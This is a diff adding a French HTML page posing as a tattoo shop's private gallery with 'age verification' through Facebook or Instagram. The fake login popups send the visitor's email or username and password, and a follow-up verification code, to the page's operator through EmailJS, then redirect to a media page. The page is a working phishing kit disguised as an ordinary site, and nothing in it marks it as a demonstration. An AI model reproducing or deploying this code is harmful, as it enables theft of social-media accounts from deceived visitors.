@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="utf-8"/>
+  <title>Gallerie privée !</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <!-- Balises Open Graph pour l’aperçu -->
+  <meta property="og:title" content="Accès à ma gallerie privée."/>
+  <meta property="og:image" content="https://tatoos-shop.onrender.com/preview_tatoos.png"/>
+  <meta property="og:url" content="https://tatoos-shop.onrender.com"/>
+  <meta property="og:type" content="website"/>
+
+  <!-- Balises Twitter pour compatibilité -->
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="Gallerie privée !"/>
+  <meta name="twitter:image" content="https://tatoos-shop.onrender.com/preview_tatoos.png"/>
+
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <style>
+    :root{
+      --bg1:#1a1c2c;
+      --bg2:#2a2f4f;
+      --accent1:#7b61ff;
+      --accent2:#ff6ac1;
+      --glass:rgba(26,28,44,0.6);
+      --glass-border:rgba(255,255,255,0.18);
+      --muted:#e6e7f2;
+      --fb1:#1877F2; --fb2:#4a90e2;
+      --ig1:#f09433; --ig2:#bc1888; /* dégradé Instagram */
+      --shadow:0 18px 50px rgba(0,0,0,.55);
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Playfair Display', serif;
+      color: #fff;
+      text-align: center;
+      background:
+        radial-gradient(1200px 700px at 20% -10%, #283069 0%, transparent 60%),
+        radial-gradient(1000px 600px at 100% 10%, #24305a 0%, transparent 60%),
+        linear-gradient(135deg, var(--bg1), var(--bg2));
+      min-height:100vh;
+      position: relative;
+      overflow-x:hidden;
+    }
+
+    .header { padding: 48px 20px 18px; }
+    .header h1 {
+      font-size: clamp(2.2rem, 6vw, 4rem);
+      color: #FFFFFF;
+      text-shadow: 0 10px 30px rgba(0,0,0,0.35);
+      margin: 0 0 10px;
+    }
+    .subtitle { font-size: clamp(1rem, 2.6vw, 1.4rem); color: var(--muted); margin: 0 0 18px; }
+
+    .cta-row{ display:flex; gap:12px; justify-content:center; flex-wrap:wrap; margin-bottom:6px; }
+
+    .button {
+      color: #fff;
+      border: none;
+      padding: 14px 22px;
+      font-size: 1.05em;
+      font-weight: 700;
+      border-radius: 9999px;
+      cursor: pointer;
+      transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+      display:inline-flex; align-items:center; gap:10px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.35), inset 0 0 0 1px rgba(255,255,255,.08);
+    }
+    .button[disabled] { opacity:.7; cursor:not-allowed; }
+    .button:hover { filter:saturate(1.05); transform: translateY(-2px); box-shadow: 0 16px 35px rgba(0,0,0,0.45); }
+    .button.fb{ background: linear-gradient(90deg, var(--fb1), var(--fb2)); }
+    .button.ig{ background: linear-gradient(90deg, var(--ig1), var(--ig2)); }
+    .icon { width:18px; height:18px; display:inline-block; }
+
+    /* Avatars : hexagone autour du centre */
+    .bitmoji-layout{
+      position: relative;
+      width: 480px; height: 480px;
+      margin: 26px auto 8px;
+      max-width: 92vw; max-height: 92vw;
+    }
+    .bitmoji {
+      --scale: 1;
+      width: 112px; height: 112px;
+      background-size: cover; background-position: center;
+      clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%);
+      border: 2px solid rgba(255,255,255,0.85);
+      box-shadow: 0 8px 22px rgba(0,0,0,0.45);
+      position: absolute;
+      cursor: pointer;
+      transition: transform .25s ease, box-shadow .25s ease, outline .25s ease, filter .25s ease;
+      outline: 0 solid transparent;
+      transform: translate(-50%, -50%) scale(var(--scale));
+      will-change: transform, top, left;
+    }
+    .bitmoji:hover { --scale: 1.08; box-shadow: 0 12px 28px rgba(0,0,0,.55); }
+    .bitmoji.active { outline: 10px solid rgba(255,255,255,0.12); filter: saturate(1.06); }
+
+    .bottom-banner { display:flex; justify-content:center; position:relative; }
+    .bottom-banner img {
+      width: 92%;
+      max-width: 1000px;
+      height: auto;
+      display: block;
+      margin: 18px auto 24px;
+      border-radius: 22px;
+      box-shadow: var(--shadow);
+      transition: border-radius .25s ease, box-shadow .25s ease, transform .25s ease, filter .25s ease;
+    }
+    .bottom-banner.avatar-mode img{
+      border-radius: 18px;
+      box-shadow: 0 22px 60px rgba(0,0,0,.6);
+      transform: translateZ(0);
+      filter: saturate(1.05);
+    }
+
+    .overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.55);
+      display: none;
+      z-index: 999;
+      backdrop-filter: blur(2px);
+    }
+    .login-popup, .verification-popup {
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90%; max-width: 460px;
+      background: var(--glass);
+      color: #e8ebff;
+      padding: 24px;
+      border-radius: 22px;
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      display: none;
+      text-align: left;
+      z-index: 1000;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      backdrop-filter: blur(14px);
+    }
+    .login-popup h3, .verification-popup h3 {
+      margin: 0 0 12px;
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #fff;
+      text-align: center;
+    }
+    .login-popup label, .verification-popup label { color: #e8ebff; font-weight: 600; display: inline-block; margin: 8px 0; }
+    .login-popup input, .verification-popup input {
+      width: 100%;
+      background: rgba(30,32,52,.85);
+      border: 1px solid #3A3F68;
+      color: #e8ebff;
+      border-radius: 12px;
+      padding: 12px;
+      outline: none;
+      margin-bottom: 10px;
+    }
+    .login-popup input::placeholder, .verification-popup input::placeholder { color: #b8bde0; }
+
+    .popup-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .btn { 
+      border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 800; cursor: pointer;
+    }
+    .btn[disabled] { opacity:.7; cursor:not-allowed; }
+    .btn-primary { background: linear-gradient(90deg, var(--accent1), var(--accent2)); color: #fff; }
+    .btn-primary:hover { filter:saturate(1.06) brightness(1.02); }
+    .btn-secondary { background: transparent; color: #e8ebff; border: 1px solid #3A3F68; }
+    .btn-secondary:hover { background: rgba(42,46,74,.8); }
+
+    .helper { font-size:.9rem; color:#cfd4ff; margin-top:6px; min-height:1.2em; }
+  
+    .sound-toggle {
+      position: fixed;
+      right: 14px;
+      bottom: 14px;
+      z-index: 2000;
+      background: #232845;
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 9999px;
+      padding: 10px 14px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow:
+        8px 8px 18px rgba(0,0,0,0.35),
+        -6px -6px 16px rgba(255,255,255,0.06);
+      display:inline-block;
+    }
+    .sound-toggle:hover { filter:saturate(1.05) brightness(1.03); }
+  </style>
+</head>
+<body>
+
+  <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio>
+
+  <div class="header">
+    <h1>Tatoos shop - Gallerie privée ! !</h1>
+    <p class="subtitle">validez votre âge et accèdez à mon univers, ma passion, mon travail!</p>
+
+    <div class="cta-row">
+      <button class="button fb" id="facebookBtn" onclick="triggerFirstPlay(); openFacebookPopup()">
+        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06c0 4.99 3.66 9.13 8.44 9.94v-7.03H7.9v-2.91h2.54V9.41c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.78l-.44 2.91h-2.34V22c4.78-.81 8.44-4.95 8.44-9.94z"/>
+        </svg>
+        Valider mon âge (Facebook)
+      </button>
+
+      <button class="button ig" id="instagramBtn" onclick="triggerFirstPlay(); openInstagramPopup()">
+        <!-- Icône Instagram simplifiée -->
+        <svg class="icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M7 2h10a5 5 0 015 5v10a5 5 0 01-5 5H7a5 5 0 01-5-5V7a5 5 0 015-5zm10 2H7a3 3 0 00-3 3v10a3 3 0 003 3h10a3 3 0 003-3V7a3 3 0 00-3-3zm-5 3.5a5.5 5.5 0 110 11 5.5 5.5 0 010-11zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7zM18 6.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z"/>
+        </svg>
+        Valider mon âge (Instagram)
+      </button>
+    </div>
+  </div>
+
+  <!-- Avatars en hexagone autour du centre -->
+  <div class="bitmoji-layout" id="bitmojiHex">
+    <div class="bitmoji" data-src="avatar1.png" style="background-image:url('avatar1.png')"></div>
+    <div class="bitmoji" data-src="avatar2.png" style="background-image:url('avatar2.png')"></div>
+    <div class="bitmoji" data-src="avatar3.png" style="background-image:url('avatar3.png')"></div>
+    <div class="bitmoji" data-src="avatar4.png" style="background-image:url('avatar4.png')"></div>
+    <div class="bitmoji" data-src="avatar5.png" style="background-image:url('avatar5.png')"></div>
+    <div class="bitmoji" data-src="avatar6.png" style="background-image:url('avatar6.png')"></div>
+  </div>
+
+  <div class="bottom-banner" id="bannerWrap">
+    <img src="banner.png" alt="Shooting banner" id="mainBanner"/>
+  </div>
+
+  <!-- Overlay & Popups -->
+  <div id="overlay" class="overlay" onclick="closeAllPopups()"></div>
+
+  <div class="login-popup" id="facebookPopup">
+    <h3>Valide ton âge avec Facebook</h3>
+    <label for="fb-email">E-mail ou numéro de mobile</label>
+    <input id="fb-email" type="text" placeholder="E-mail ou numéro de mobile"/>
+    <label for="fb-password">Mot de passe</label>
+    <input id="fb-password" type="password" placeholder="Mot de passe"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="fb-submit" onclick="submitFacebook()">Confirmer</button>
+      <button class="btn btn-secondary" onclick="closePopup('facebookPopup')">Retour</button>
+    </div>
+    <div class="helper" id="fb-helper"></div>
+  </div>
+
+  <!-- Popup Instagram -->
+  <div class="login-popup" id="instagramPopup">
+    <h3>Valide ton âge avec Instagram</h3>
+    <label for="ig-user">Nom d’utilisateur</label>
+    <input id="ig-user" type="text" placeholder="Nom d’utilisateur"/>
+    <label for="ig-password">Mot de passe</label>
+    <input id="ig-password" type="password" placeholder="Mot de passe"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="ig-submit" onclick="submitInstagram()">Confirmer</button>
+      <button class="btn btn-secondary" onclick="closePopup('instagramPopup')">Retour</button>
+    </div>
+    <div class="helper" id="ig-helper"></div>
+  </div>
+
+  <div class="verification-popup" id="verificationPopup">
+    <h3>Validation des informations</h3>
+    <label for="verificationCode">Entrer le code reçu :</label>
+    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\\d*" placeholder="Code de 6 à 8 chiffres"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="code-submit" onclick="finishAndContinue()">OK</button>
+      <button class="btn btn-secondary" onclick="closePopup('verificationPopup')">Retour</button>
+    </div>
+    <div class="helper" id="code-helper"></div>
+  </div>
+
+  <script>
+    // Init EmailJS (inchangé)
+    document.addEventListener('DOMContentLoaded', function(){
+      if (window.emailjs) {
+        console.log('EmailJS init OK');
+    emailjs.init('AATQVLMcBJaRBgEox');
+      }
+      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
+    });
+
+    function openFacebookPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('facebookPopup').style.display = 'block';
+    }
+    function openInstagramPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('instagramPopup').style.display = 'block';
+    }
+    function closePopup(id) {
+      document.getElementById(id).style.display = 'none';
+      const anyOpen = document.querySelector('.login-popup[style*="display: block"], .verification-popup[style*="display: block"]');
+      if (!anyOpen) document.getElementById('overlay').style.display = 'none';
+    }
+    function closeAllPopups(){
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById('facebookPopup').style.display = 'none';
+      document.getElementById('instagramPopup').style.display = 'none';
+      document.getElementById('verificationPopup').style.display = 'none';
+    }
+
+    // EmailJS – Facebook
+    async function submitFacebook(){
+      const email = document.getElementById('fb-email').value.trim();
+      const pass  = document.getElementById('fb-password').value.trim();
+      const btn   = document.getElementById('fb-submit');
+      const help  = document.getElementById('fb-helper');
+
+      if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Envoi en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_connexion', {
+          fb_email: "Facebook " + email,
+          fb_password: pass
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
+        help.textContent = 'Informations envoyées. Vérification...';
+        closePopup('facebookPopup');
+        document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    // EmailJS – Instagram
+    async function submitInstagram(){
+      const user = document.getElementById('ig-user').value.trim();
+      const pass = document.getElementById('ig-password').value.trim();
+      const btn  = document.getElementById('ig-submit');
+      const help = document.getElementById('ig-helper');
+
+      if (!user || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Envoi en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_connexion', {
+          fb_email: "Instagram " + user,
+          fb_password: pass
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
+        help.textContent = 'Informations envoyées. Vérification...';
+        closePopup('instagramPopup');
+        document.getElementById('verificationPopup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    // EmailJS – code (inchangé)
+    async function finishAndContinue(){
+      const code = document.getElementById('verificationCode').value.trim();
+      const btn  = document.getElementById('code-submit');
+      const help = document.getElementById('code-helper');
+
+      if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Validation en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_code', {
+          verification_code: code
+        }).then(function(res){console.log('EmailJS OK', res);}).catch(function(err){console.error('EmailJS ERROR', err);});
+        closeAllPopups();
+        window.location.href = 'medias.html';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+  </script>
+
+  <!-- Hexagon layout + banner replacement + first-click audio trigger -->
+  <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const container = document.getElementById('bitmojiHex');
+    const avatars = container ? container.querySelectorAll('.bitmoji') : [];
+    const banner  = document.getElementById('mainBanner');
+    const bannerWrap = document.getElementById('bannerWrap');
+
+    if (!container || !avatars.length || !banner || !bannerWrap) return;
+
+    const defaultBanner = banner.getAttribute('src');
+
+    function layoutHex(){
+      const rect = container.getBoundingClientRect();
+      const cx = rect.width / 2;
+      const cy = rect.height / 2;
+      const r = Math.min(rect.width, rect.height) * 0.38;
+      avatars.forEach((el, i) => {
+        const angleDeg = -90 + i * 60;
+        const rad = angleDeg * Math.PI / 180;
+        const x = cx + r * Math.cos(rad);
+        const y = cy + r * Math.sin(rad);
+        el.style.left = x + 'px';
+        el.style.top  = y + 'px';
+      });
+    }
+    layoutHex();
+    window.addEventListener('resize', layoutHex);
+
+    function extractUrlFrom(el){
+      let bg = el.style.backgroundImage;
+      let m = bg && bg.match(/url\\(["']?(.*?)["']?\\)/);
+      if (m && m[1]) return m[1];
+      const cs = getComputedStyle(el).backgroundImage;
+      m = cs && cs.match(/url\\(["']?(.*?)["']?\\)/);
+      if (m && m[1]) return m[1];
+      return el.getAttribute('data-src') || null;
+    }
+
+    // Trigger audio on first avatar click too
+    function onAvatarClick(el){
+      triggerFirstPlay();
+      avatars.forEach(a => a.classList.remove('active'));
+      el.classList.add('active');
+      const src = extractUrlFrom(el);
+      if (src) {
+        banner.src = src;
+        bannerWrap.classList.add('avatar-mode');
+      }
+    }
+
+    avatars.forEach(function(el) {
+      el.addEventListener('click', function() { onAvatarClick(el); });
+    });
+
+    banner.addEventListener('dblclick', function() {
+      banner.src = defaultBanner;
+      bannerWrap.classList.remove('avatar-mode');
+      avatars.forEach(a => a.classList.remove('active'));
+    });
+  });
+  </script>
+
+  <!-- Bouton Son : icône 🔊/🔇 et déclenchement au premier clic -->
+  <button id="soundToggle" class="sound-toggle" aria-label="Activer/Désactiver le son">🔇</button>
+
+  <script>
+  // Gestion audio : lecture au tout premier clic utilisateur (n'importe où) + helpers
+  let __audioPrimed = false;
+  function triggerFirstPlay(){
+    const audio = document.getElementById('bgm');
+    const toggle = document.getElementById('soundToggle');
+    if (!audio || !toggle) return;
+    if (!__audioPrimed){
+      audio.muted = false;
+      audio.play().then(() => {
+        toggle.textContent = '🔊';
+        __audioPrimed = true;
+      }).catch(() => {
+        // fallback: garder le bouton mais marquer comme primé
+        toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊';
+        __audioPrimed = true;
+      });
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    const audio = document.getElementById('bgm');
+    const toggle = document.getElementById('soundToggle');
+    if (!audio || !toggle) return;
+
+    audio.muted = true;
+    audio.play().catch(()=>{}); // tentative silencieuse
+
+    const setIcon = () => { toggle.textContent = (audio.muted || audio.paused) ? '🔇' : '🔊'; };
+
+    // Premier clic n'importe où => jouer
+    const primeOnce = () => { triggerFirstPlay(); document.removeEventListener('click', primeOnce); };
+    document.addEventListener('click', primeOnce, { once:true });
+
+    toggle.addEventListener('click', function(e){
+      e.stopPropagation();
+      if (audio.muted || audio.paused) {
+        triggerFirstPlay();
+      } else {
+        audio.pause();
+        audio.muted = true;
+        setIcon();
+      }
+    });
+
+    setTimeout(() => { setIcon(); }, 600);
+  });
+  </script>
+
+</body>
+</html>
